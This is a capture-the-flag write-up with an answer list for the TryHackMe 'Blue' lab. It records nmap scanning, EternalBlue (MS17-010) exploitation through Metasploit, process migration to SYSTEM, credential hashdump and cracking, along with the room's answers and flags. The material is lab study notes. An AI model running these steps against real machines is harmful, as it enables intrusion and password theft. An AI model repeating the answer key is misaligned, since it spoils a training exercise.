# Blue machine on thm

This is my first machine repository.\
This repository is made with the purpose of taking notes about the machine, therefore possible future study material.

## THM tasks

- How many ports are open with a port number under 1000?
  - 3

- What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
  - ms17-010

- Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
  - exploit/windows/smb/ms17_010_eternalblue

- Show options and set the one required value. What is the name of this value? (All caps for submission)
  - rhosts

- If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
  - post/multi/manage/shell_to_meterpreter

- Select this (use MODULE_PATH). Show options, what option are we required to change?
  - sessions

- Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
  - jon

- Copy this password hash to a file and research how to crack it. What is the cracked password?
  - alqfna22

- Flag1? This flag can be found at the system root. 
  - flag{access_the_machine}

- Flag2? This flag can be found at the location where passwords are stored within Windows.
  - flag{sam_database_elevated_access}

- Flag3?
  - flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 

## Pocedure

### Scanning

First of all, I'm making an nmap scan and saving it in the file initialNmap_scan:
```
sudo nmap -sV -vv -script vuln 10.10.92.38 -oN initialNmap_scan
```

The scans shows a remote code execution (RCE) vulnerability in Microsoft SMBv1 servers.

### Exploit

This vulneravility should be exploitable with metasploit, so I'm starting it:
```
msfconsole
```

I look for the right module in metasploit:
```
search ms17-010
```

I find eternalblue and I select it:
```
use <number of module in the list>
```

After selecting it, I set the value rhosts with the IP of the target machine in THM
```
set rhosts 10.10.92.38
```

It's al set now, time to run the expoit
```
run
```

### Escalate
At this point, I'm rebooting the machine so the IP is different (10.21.13.118)

I've realised that I didn't set the lhost to my openvpn IP, and that was causing the failure, now I set it up:
```
setg lhost 10.21.13.118
```

The exploit should have set up a shell, and I was supposed to escalate it to meterpreter, but with the default payload it already escalated it, so there's no need to do it mannually.
If i run 'shell' and 'whoami' I will get that we are system.

PID of the powershell.exe NT AUTHORITY\SYSTEM: 2900

Now we migrate to this process:
```
migrate PROCESS_ID
```

Now we are in the powershell.
I now run 'hashdump' to get the hashes of the users: Jon, and check if I can crack the password in hashes.com

### Flags

I've found the first flag running 'search flag*'

Now I just have to go to the directories and check them.
